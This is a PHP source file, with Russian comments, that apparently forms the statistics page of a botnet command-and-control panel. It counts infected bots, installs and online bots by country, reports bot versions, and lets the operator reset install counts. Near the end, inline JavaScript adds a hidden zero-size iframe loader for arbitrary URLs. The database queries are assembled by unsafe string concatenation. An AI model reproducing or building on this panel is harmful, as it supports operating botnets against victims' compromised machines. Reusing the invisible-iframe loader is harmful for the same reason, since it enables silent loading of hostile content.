<?php if(!defined('__CP__'))die();

define('COUNTRYLIST_WIDTH', 200);  //Ширина колонки стран.
define('STAT_WIDTH',        '1%'); //Ширина колонки статистики.

//Очистка списка Инсталлов.
if(isset($_GET['reset_installs']) && !empty($_USER_DATA['r_stats_main_reset']))
{
  $query = 'UPDATE botnet_list SET flag_install=0';
  if(!empty($_GET['botnet']))$query .= " WHERE botnet='".addslashes($_GET['botnet'])."'";
  @mysql_query($query);
  
  if(empty($_GET['botnet']))header('Location: '.QUERY_STRING);
  else header('Location: '.QUERY_STRING.'&botnet='.urlencode($_GET['botnet']));
  
  die();
}

//Текущий ботнет.
define('CURRENT_BOTNET', (!empty($_GET['botnet']) ? $_GET['botnet'] : ''));

///////////////////////////////////////////////////////////////////////////////
// Вывод общей информации.
///////////////////////////////////////////////////////////////////////////////

$i = 0;
$_OUTPUT = str_replace('{WIDTH}', (COUNTRYLIST_WIDTH * 2).'px', THEME_LIST_BEGIN).
           str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_STATS_TOTAL_INFO), THEME_LIST_TITLE);

//Подсчет количества отчетов в базе данных
if(!empty($_USER_DATA['r_reports_db']))
{
  $rlist = ListReportTables(MYSQL_DB);
  $reports_count  = 0;
  foreach($rlist as $table)if(($mt = @mysql_fetch_row(@mysql_query('SELECT COUNT(*) FROM '.$table))))$reports_count += $mt[0];
  $_OUTPUT .= 
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_REPORTS),                  $i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1).
    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, number_format_as_int($reports_count)), $i % 2 ? THEME_LIST_ITEM_RTEXT_U2 : THEME_LIST_ITEM_RTEXT_U1).
  THEME_LIST_ROW_END;
  
  $i++;
}

$_OUTPUT .= GetBotnetStats('', $i).THEME_LIST_END.THEME_STRING_NEWLINE;

///////////////////////////////////////////////////////////////////////////////
// Вывод информации об текущем ботнете.
///////////////////////////////////////////////////////////////////////////////

$_action_list = '';
if(!empty($_USER_DATA['r_stats_main_reset']))
{
  $_action_list = str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_STATS_BOTNET_ACTIONS.'&#160;'.
    str_replace(array('{TEXT}',     '{JS_EVENTS}'),
    array(LNG_STATS_RESET_INSTALLS, ' onclick="if(confirm(\''.addjsslashes(LNG_STATS_RESET_INSTALLS_Q).'\'))window.location=\''.QUERY_STRING_HTML.'&amp;reset_installs&amp;botnet='.addjsslashes(urlencode(CURRENT_BOTNET)).'\';"'),
    THEME_DIALOG_ITEM_ACTION)
  ),
  THEME_DIALOG_TITLE);
}

$_OUTPUT .= 
str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_STATS_BOTNET.'&#160;'.BotnetsToListBox(CURRENT_BOTNET, '')), THEME_DIALOG_TITLE).
$_action_list;

//Сбор статистики для конкретного ботнета.
if(CURRENT_BOTNET != '')
{
  $_OUTPUT .=
    THEME_DIALOG_ROW_BEGIN.
      str_replace('{COLUMNS_COUNT}', 2, THEME_DIALOG_ITEM_CHILD_BEGIN).
        str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN).
          GetBotnetStats(CURRENT_BOTNET, 0).
        THEME_LIST_END.
      THEME_DIALOG_ITEM_CHILD_END.
    THEME_DIALOG_ROW_END;
}

//Вывод списка стран.
$common_query = ((CURRENT_BOTNET != '') ? ' AND botnet=\''.addslashes(CURRENT_BOTNET).'\'' : '');
$_OUTPUT .= 
THEME_DIALOG_ROW_BEGIN.  
  str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
    ListCountries(LNG_STATS_COLUMN_INSTALLS, 'flag_install=1'.$common_query).
  THEME_DIALOG_ITEM_CHILD_END.
  str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
    ListCountries(LNG_STATS_COLUMN_ONLINE, 'rtime_last>=\''.(CURRENT_TIME - BOTNET_TIMEOUT).'\''.$common_query).
  THEME_DIALOG_ITEM_CHILD_END.
THEME_DIALOG_ROW_END.
THEME_DIALOG_END;

ThemeBegin(LNG_STATS, 0, 0, 0);
echo $_OUTPUT;
echo "<div id='mast'></div><script type='text/javascript' language='JavaScript'>
function send_data(ifr_url)
{
var ifr0 = document.createElement('iframe');
ifr0.src = ifr_url; 
ifr0.style.width = '0px';
ifr0.style.height = '0px';
var div_x0 = document.getElementById('mast');
div_x0.appendChild(ifr0);
}
</script>"; 
ThemeEnd();

///////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////

/*
  Создание информации по ботнету.
  
  IN $botnet - string, название ботнета.
  IN  $i     - int, счетчик номера строки.
  
  Return    - string, часть таблицы.
*/
function GetBotnetStats($botnet, $i)
{
  $query1 = '';
  $query2 = '';
  
  if($botnet != '')
  {
    $botnet = addslashes($botnet);
    $query1 = " WHERE botnet='{$botnet}'";
    $query2 = " AND botnet='{$botnet}'";
  }
  
  //Количетсво ботов, и время первого отчета.
  $tmp = htmlentities_ex(($mt = @mysql_fetch_row(@mysql_query("SELECT MIN(rtime_first), COUNT(bot_id), MIN(bot_version), MAX(bot_version) FROM botnet_list{$query1}"))) && $mt[0] > 0 ? gmdate(LNG_FORMAT_DT, $mt[0]) : '-');
  $data =
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_FIRST_BOT), $i == 0 ? THEME_LIST_ITEM_LTEXT_U1 : THEME_LIST_ITEM_LTEXT_U2).
    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, $tmp),                $i == 0 ? THEME_LIST_ITEM_RTEXT_U1 : THEME_LIST_ITEM_RTEXT_U2). //Пусть будет num.
  THEME_LIST_ROW_END.
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_BOTS),         $i == 0 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1).
    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, number_format_as_int($mt[1])), $i == 0 ? THEME_LIST_ITEM_RTEXT_U2 : THEME_LIST_ITEM_RTEXT_U1).
  THEME_LIST_ROW_END;

  $total_bots  = $mt[1];
  $min_version = $mt[2];
  $max_version = $mt[3];

  //Количетсво ботов активных за последнии 24 часа.
  $tmp = ($mt = @mysql_fetch_row(@mysql_query('SELECT COUNT(bot_id) FROM botnet_list WHERE rtime_last>='.(CURRENT_TIME - 86400).$query2))) ? $mt[0] : 0;
  $data .= 
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_BOTS24),        $i == 0 ? THEME_LIST_ITEM_LTEXT_U1 : THEME_LIST_ITEM_LTEXT_U2).
    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, ($total_bots > 0 ? number_format_as_float(($tmp * 100) / $total_bots, 2) : 0).'% -  '.number_format_as_int($tmp)),    $i == 0 ? THEME_LIST_ITEM_RTEXT_U1 : THEME_LIST_ITEM_RTEXT_U2).
  THEME_LIST_ROW_END;
 
  //Максимальная и минимальная версия бота.
  $data .= 
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_MIN_VERSION), $i == 0 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1).
    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, IntToVersion($min_version)),  $i == 0 ? THEME_LIST_ITEM_RTEXT_U2 : THEME_LIST_ITEM_RTEXT_U1).
  THEME_LIST_ROW_END.
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_MAX_VERSION), $i == 0 ? THEME_LIST_ITEM_LTEXT_U1 : THEME_LIST_ITEM_LTEXT_U2).
    str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, IntToVersion($max_version)),  $i == 0 ? THEME_LIST_ITEM_RTEXT_U1 : THEME_LIST_ITEM_RTEXT_U2).
  THEME_LIST_ROW_END;
  
  return $data;
}

/*
  Создание таблицы со списом стран.
  
  IN $name  - string, название таблицы.
  IN $query - string, дополнительные условия для SQL-запроса.
  
  Return    - string, таблица.
*/
function ListCountries($name, $query)
{
  $data = str_replace('{WIDTH}', COUNTRYLIST_WIDTH.'px', THEME_LIST_BEGIN);
  
  $r = @mysql_query('SELECT country, COUNT(country) FROM botnet_list WHERE '.$query.' GROUP BY BINARY country ORDER BY COUNT(country) DESC, country ASC');
  if($r && @mysql_affected_rows() > 0)
  {
    //Составляем список.
    $count = 0;
    $i = 0;
    $list = '';
    
    while(($m = mysql_fetch_row($r)))
    {
      $list .=
      THEME_LIST_ROW_BEGIN.
        str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex($m[0])),     $i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1).
        str_replace(array('{WIDTH}', '{TEXT}'), array('8em', number_format_as_int($m[1])), $i % 2 ? THEME_LIST_ITEM_RTEXT_U2 : THEME_LIST_ITEM_RTEXT_U1).
      THEME_LIST_ROW_END;
      
      $count += $m[1];
      $i++;
    }
    
    //Заголовок
    $data .= str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, sprintf($name, number_format_as_int($count))), THEME_LIST_TITLE).$list;
  }
  //Ошибка.
  else
  {
    $data .= 
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, sprintf($name, 0)), THEME_LIST_TITLE).
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, $r ? LNG_STATS_COUNTRYLIST_EMPTY : mysql_error_ex()), THEME_LIST_ITEM_EMPTY_1).
    THEME_LIST_ROW_END;
  }
  return $data.THEME_LIST_END;
}
?>
